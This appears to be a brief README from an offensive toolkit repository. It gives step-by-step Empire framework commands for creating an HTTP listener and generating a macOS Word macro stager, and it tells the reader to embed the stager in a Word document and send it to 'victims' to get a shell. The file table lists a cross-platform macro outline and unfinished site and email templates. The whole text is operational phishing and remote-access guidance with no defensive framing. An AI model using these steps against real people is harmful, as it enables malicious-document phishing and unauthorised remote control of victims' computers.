# Payload Generation
---
### Empire
It's very easy to generate shell stagers/payloads with Empire. You can create office macros, DDE'd word documents, applescript, and a heap more.
##### General process is as follows:
###### Create a listener:
Enter the listeners menu: `listeners`
Choose a listener to create: `uselistener http` - Press <TAB> to see more than just http
View your listener info: `info`
_Note that you can add certs for communication over TLS_
And change accordingly: `set Name acmeHTTP`
Execute your listener: `execute`
###### Create a stager that uses the newly created listener:
`main` to go to the main menu.
Pick a payload: `usestager osx/macro` - press <TAB> to view the plethora of other payloads
You can view the info of a stager by typing `info`
Specify the stager to use the created listener: `set Listener acmeHTTP`
Set the OutFile of your payload (unless stdout is fine with you): `set OutFile /tmp/acmeOSXMacro`

Chuck that in a Word document and send it to your macOS-enabled victims to get a shell.

### Msfvenom
**RTFM.**

#### File list
| File | Description |
|------|-------------|
|xplatform.txt | cross-platform macro outline. Host document must be created on Windows |
|Site Templates | ??? |
|Email Templates | ??? |
